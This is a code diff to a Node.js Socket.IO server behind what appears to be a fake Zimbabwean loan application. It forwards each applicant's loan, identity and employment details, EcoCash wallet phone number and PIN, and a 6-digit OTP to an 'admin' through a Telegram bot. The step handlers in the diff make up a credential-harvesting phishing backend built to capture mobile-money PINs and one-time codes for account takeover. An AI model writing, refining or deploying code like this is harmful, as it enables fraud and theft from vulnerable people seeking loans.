@@ -25,6 +25,8 @@ const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
 
 app.use(cors());
 app.use(express.json());
+
+// Serves your static files (index.html, assets, etc.) from the public folder
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Webhook Route for Telegram
@@ -34,7 +36,7 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    // Generate a unique AppID for the session
+    // Generate a unique AppID for the session prefixing Zimbabwe setup
     const appId = `ZIM-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
     // Join the room so the bot can "call back" this specific user
@@ -43,17 +45,19 @@ io.on('connection', (socket) => {
     console.log(`🔌 User connected: ${appId}`);
     socket.emit('session-ready', { appId: appId });
 
-    // Step Handlers
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 1: Loan", data));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 2: Identity", data));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 3: Employment", data));
+    // Step Handlers (Aligned with Dollars $)
+    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 1: Loan Details ($)", data));
+    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 2: Identity Verification", data));
+    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 3: Employment Info ($)", data));
 
-    // Step 4: Mobile Money Wallet Details (4-digit PIN verification)
+    // Step 4: Mobile Money Wallet Details (4-digit wallet PIN verification)
+    // Frontend sends compiled payload containing: { phone, password }
     socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇿🇼 Step 4: Mobile Money Details", data, true);
+        botManager.sendToAdmin(appId, "🇿🇼 Step 4: EcoCash Wallet PIN", data, true);
     });
 
-    // Step 5: Final Submission (6-digit OTP code triggered automatically on input)
+    // Step 5: Final Verification (6-digit OTP confirmation token)
+    // Frontend sends compiled payload containing: { pin }
     socket.on('step5', (data) => {
         botManager.sendFinalApproval(appId, data.pin);
     });
